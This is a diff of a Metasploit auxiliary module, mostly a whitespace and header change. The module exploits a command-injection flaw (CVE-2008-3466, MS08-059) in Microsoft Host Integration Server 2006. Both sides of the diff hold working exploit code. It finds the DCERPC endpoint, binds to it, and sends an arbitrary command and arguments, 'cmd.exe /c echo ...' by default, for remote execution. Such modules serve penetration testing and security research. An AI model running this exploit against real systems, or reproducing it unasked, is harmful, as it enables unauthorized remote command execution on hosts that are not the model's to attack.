@@ -1,87 +1,85 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::DCERPC
+  include Msf::Exploit::Remote::DCERPC
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Microsoft Host Integration Server 2006 Command Execution Vulnerability',
-			'Description'    => %q{
-					This module exploits a command-injection vulnerability in Microsoft Host Integration Server 2006.
-			},
-			'DefaultOptions' =>
-				{
-					'DCERPC::ReadTimeout' => 300 # Long-running RPC calls
-				},
-			'Author'         => [ 'MC' ],
-			'License'        => MSF_LICENSE,
-			'References'     =>
-				[
-					[ 'MSB', 'MS08-059' ],
-					[ 'CVE', '2008-3466' ],
-					[ 'OSVDB', '49068' ],
-					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=745' ],
-				],
-			'DisclosureDate' => 'Oct 14 2008'))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Microsoft Host Integration Server 2006 Command Execution Vulnerability',
+      'Description'    => %q{
+          This module exploits a command-injection vulnerability in Microsoft Host Integration Server 2006.
+      },
+      'DefaultOptions' =>
+        {
+          'DCERPC::ReadTimeout' => 300 # Long-running RPC calls
+        },
+      'Author'         => [ 'MC' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'MSB', 'MS08-059' ],
+          [ 'CVE', '2008-3466' ],
+          [ 'OSVDB', '49068' ],
+          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=745' ],
+        ],
+      'DisclosureDate' => 'Oct 14 2008'))
 
-			register_options(
-				[
-				Opt::RPORT(0),
-				OptString.new('COMMAND', [ true, 'The command to execute', 'cmd.exe']),
-				OptString.new('ARGS', [ true, 'The arguments to the command', '/c echo metasploit > metasploit.txt'])
-				], self.class )
-	end
+      register_options(
+        [
+        Opt::RPORT(0),
+        OptString.new('COMMAND', [ true, 'The command to execute', 'cmd.exe']),
+        OptString.new('ARGS', [ true, 'The arguments to the command', '/c echo metasploit > metasploit.txt'])
+        ], self.class )
+  end
 
-	def run
+  def run
 
-		dport = datastore['RPORT'].to_i
+    dport = datastore['RPORT'].to_i
 
-		if (dport != 0)
-			print_status("Could not use automatic target when the remote port is given");
-			return
-		end
+    if (dport != 0)
+      print_status("Could not use automatic target when the remote port is given");
+      return
+    end
 
-		if (dport == 0)
+    if (dport == 0)
 
-			dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp')
-			dport ||= dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.1', 'ncacn_ip_tcp')
+      dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp')
+      dport ||= dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.1', 'ncacn_ip_tcp')
 
-			if (not dport)
-				print_status("Could not determine the RPC port used by the Service.")
-				return
-			end
+      if (not dport)
+        print_status("Could not determine the RPC port used by the Service.")
+        return
+      end
 
-				print_status("Discovered Host Integration Server RPC service on port #{dport}")
-		end
+        print_status("Discovered Host Integration Server RPC service on port #{dport}")
+    end
 
-		connect(true, { 'RPORT' => dport })
+    connect(true, { 'RPORT' => dport })
 
-		dcerpc_handle('ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
-		print_status("Binding to #{handle} ...")
+    dcerpc_handle('ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
+    print_status("Binding to #{handle} ...")
 
-		dcerpc_bind(handle)
-		print_status("Bound to #{handle} ...")
+    dcerpc_bind(handle)
+    print_status("Bound to #{handle} ...")
 
-		cmd =  NDR.string("#{datastore['COMMAND']}") + NDR.string("#{datastore['ARGS']}")
+    cmd =  NDR.string("#{datastore['COMMAND']}") + NDR.string("#{datastore['ARGS']}")
 
-		print_status("Sending command: #{datastore['COMMAND']} #{datastore['ARGS']}")
+    print_status("Sending command: #{datastore['COMMAND']} #{datastore['ARGS']}")
 
-			begin
-				dcerpc_call(0x01, cmd)
-				rescue Rex::Proto::DCERPC::Exceptions::NoResponse
-			end
+      begin
+        dcerpc_call(0x01, cmd)
+        rescue Rex::Proto::DCERPC::Exceptions::NoResponse
+      end
 
-		disconnect
+    disconnect
 
-	end
+  end
 end
 
 =begin
